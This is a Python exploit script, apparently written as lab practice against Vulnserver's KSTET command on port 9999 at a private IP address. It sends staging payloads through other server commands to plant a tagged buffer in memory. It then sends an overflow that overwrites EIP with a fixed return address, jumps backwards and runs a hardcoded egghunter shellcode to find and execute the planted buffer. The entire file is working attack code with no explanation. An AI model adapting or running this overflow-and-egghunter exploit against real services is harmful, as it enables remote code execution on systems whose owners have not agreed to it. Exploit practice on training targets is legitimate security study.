import socket
import struct


# Function to send shellcode using one of the other commands to have it stored in memory. 
def inject_memory(TCP_IP, TCP_PORT):
	
	commands = ['STATS', 'RTIME', 'LTIME', 'SRUN', 'TRUN', 'GMON', 'GDOG', 'HTER', 'LTER', 'KSTAN'] # GTER caused issues
	
	for command in commands:
		
		payload = "{} b00bb00b{}".format(command, "B" * (500))
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((TCP_IP, TCP_PORT))

		s.send(payload)
		s.close()	
		
# Main function to redirect execution flow and execute egghunter
def main_payload(TCP_IP, TCP_PORT):

	egghunter =  b""
	egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
	egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x62\x30\x30\x62"
	egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

	payload = "KSTET /.:/"
	payload += "A" * 2 # Junk
	payload += egghunter
	payload += "A" * (76 - len(payload))
	payload += struct.pack("<I",0x625011AF) # Overwrite EIP
	payload += "\xeb\xb8" # Negative jump backwards 60 bytes
	payload += "D" * (5990 - len(payload)) # Junk
		
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((TCP_IP, TCP_PORT))

	s.send(payload)
	s.close()	

TCP_IP = '192.168.56.102'
TCP_PORT = 9999
inject_memory(TCP_IP, TCP_PORT)
main_payload(TCP_IP, TCP_PORT)